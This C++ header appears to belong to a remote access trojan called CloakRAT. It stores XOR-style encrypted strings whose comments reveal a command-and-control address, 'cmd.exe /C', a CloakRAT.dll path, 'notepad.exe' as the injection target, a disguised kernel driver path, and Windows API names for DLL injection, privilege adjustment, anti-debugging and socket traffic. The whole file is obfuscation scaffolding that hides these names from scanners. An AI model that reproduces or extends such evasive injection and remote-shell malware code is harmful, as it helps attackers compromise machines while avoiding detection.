#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i * 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 39)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 90, 113, 46, 188, 147, 196, 204, 181, 75, 253, 49, 146, 159, 231, 84, 252 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 23, 15, 31, 19, 25, 38, 3, 28, 33, 23 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 104, 93, 64, 64, 25, 115, 85, 73, 47, 9, 107 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 7, 125, 23, 120, 98, 101, 72, 94, 124, 122, 92, 9, 79, 81, 93, 124, 43, 67, 86, 95, 82, 75, 85, 104, 32, 73, 71, 75, 60, 54, 4, 71, 82, 122, 70, 64, 106, 79, 78, 118, 99, 82, 125, 124, 1, 96, 121, 118, 98, 74, 32, 85, 112, 91, 57, 71, 65, 73, 44, 63, 96, 103, 97, 2, 3, 90, 77 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 52, 80, 66, 80, 82, 102, 76, 72, 33, 67, 80, 13 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "C:\Windows\System32\O15wCv06.sys"
static uint8_t str_kphDriverPathOnDisk_data[] = { 87, 125, 23, 120, 96, 127, 67, 72, 96, 81, 91, 52, 112, 31, 22, 84, 10, 75, 22, 6, 122, 107, 20, 1, 0, 101, 67, 16, 121, 104, 22, 93, 68 };
static EncryptedBytes str_kphDriverPathOnDisk = {
    str_kphDriverPathOnDisk_data,
    sizeof(str_kphDriverPathOnDisk_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 5, 112, 89, 119, 82, 98, 100, 66, 105, 73, 90, 5, 66, 18, 12, 79, 1, 114, 77, 70, 67, 69, 65 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 79, 121, 72, 80, 116, 99, 95, 94, 106, 72, 92, 60, 75, 20, 0, 65, 11 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 98, 109, 65, 65, 82, 102 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 79, 113, 93, 65, 89, 70, 95, 67, 108, 67, 91, 27 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 108, 104, 68, 86, 67, 99, 76, 64, 78, 74, 68, 7, 64, 35, 29 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 115, 105, 95, 77, 67, 115, 125, 94, 96, 69, 77, 27, 80, 43, 0, 77, 0, 84, 92 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 71, 114, 66, 69, 83, 90, 68, 78, 125, 71, 90, 17, 98 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 76, 125, 95, 65, 86, 98, 72, 126, 106, 75, 71, 28, 70, 50, 13, 82, 10, 71, 65 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 63, 125, 65, 75, 68, 115, 101, 77, 97, 66, 68, 13 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 88, 114, 66, 75, 92, 99, 93, 124, 125, 79, 94, 1, 79, 3, 2, 69, 57, 71, 73, 65, 67, 101 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 126, 121, 72, 80, 123, 119, 94, 88, 74, 84, 90, 7, 81 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 109, 127, 73, 78, 66, 101, 89, 120, 96, 77, 77, 6, 115, 20, 12, 86, 6, 74, 64, 83, 67, 87 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 98, 113, 93, 65, 89, 70, 95, 67, 108, 67, 91, 27, 119, 9, 14, 69, 1 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 74, 121, 72, 80, 116, 99, 95, 94, 106, 72, 92, 56, 81, 9, 6, 69, 28, 85 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 108, 125, 95, 65, 86, 98, 72, 120, 96, 73, 68, 0, 70, 10, 21, 19, 93, 117, 75, 85, 86, 87, 77, 91, 3 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 107, 110, 95, 75, 84, 115, 94, 95, 60, 20, 110, 1, 81, 21, 17 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 116, 110, 95, 75, 84, 115, 94, 95, 60, 20, 102, 13, 91, 18 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 127, 125, 95, 65, 86, 98, 72, 124, 102, 86, 77 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 75, 109, 72, 80, 127, 119, 67, 72, 99, 67, 97, 6, 69, 9, 23, 77, 14, 82, 76, 91, 72 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 96, 108, 72, 69, 83, 80, 68, 64, 106 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 102, 120, 66, 86, 90, 119, 89, 97, 106, 85, 91, 9, 68, 3, 36 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 60, 114, 66, 71, 86, 122, 107, 94, 106, 67 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 10, 125, 95, 65, 86, 98, 72, 124, 125, 73, 75, 13, 80, 21, 36 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 121, 119, 94, 96, 82, 116, 88, 75, 104, 67, 90, 56, 81, 3, 22, 69, 1, 82 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 68, 121, 72, 80, 122, 121, 73, 89, 99, 67, 96, 9, 77, 2, 9, 69, 56 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 30, 104, 68, 86, 67, 99, 76, 64, 95, 84, 71, 28, 70, 5, 17 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 59, 118, 72, 69, 71, 69, 72, 88, 70, 72, 78, 7, 81, 11, 4, 84, 6, 73, 75 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 1, 120, 68, 74, 83, 65, 68, 66, 107, 73, 95, 63 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 58, 121, 72, 80, 103, 100, 66, 79, 106, 85, 91, 32, 70, 7, 21 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 114, 121, 72, 80, 116, 121, 64, 92, 122, 82, 77, 26, 109, 7, 8, 69, 56 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 17, 113, 93, 65, 89, 66, 69, 94, 106, 71, 76 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 12, 121, 72, 80, 114, 120, 91, 69, 125, 73, 70, 5, 70, 8, 17, 118, 14, 84, 76, 85, 68, 72, 64, 99 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 93, 121, 72, 80, 99, 126, 95, 73, 110, 66, 107, 7, 77, 18, 0, 88, 27 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 76, 119, 94, 115, 88, 97, 27, 24, 95, 84, 71, 11, 70, 21, 22 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 18, 121, 72, 80, 96, 127, 67, 72, 96, 81, 100, 7, 77, 1, 53, 84, 29, 113 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 100, 121, 72, 80, 96, 127, 67, 72, 96, 81, 122, 13, 64, 18 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 119, 105, 126, 101, 100, 98, 76, 94, 123, 83, 88 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 29, 86, 89, 75, 89, 101 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 53, 87, 67, 65, 67, 73, 93, 88, 96, 72 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 93, 93, 66, 74, 89, 115, 78, 88 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 41, 86, 89, 75, 89, 122 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 125, 77, 72, 74, 83 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 101, 77, 66, 71, 92, 115, 89 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 48, 76, 72, 71, 65 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 67, 80, 89, 75, 95, 122 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 111, 93, 65, 75, 68, 115, 94, 67, 108, 77, 77, 28 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 74, 105, 126, 101, 116, 122, 72, 77, 97, 83, 88 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 57, 85, 72, 86, 89, 115, 65, 31, 61, 8, 76, 4, 79 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 38, 80, 89, 64, 91, 122, 3, 72, 99, 74 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 31, 95, 73, 82, 86, 102, 68, 31, 61, 8, 76, 4, 79 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 103, 73, 94, 22, 104, 37, 31, 2, 107, 74, 68 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 74, 75, 94, 65, 69, 37, 31, 2, 107, 74, 68 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 106, 105, 126, 101, 112, 115, 89, 96, 110, 85, 92, 45, 81, 20, 10, 82 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

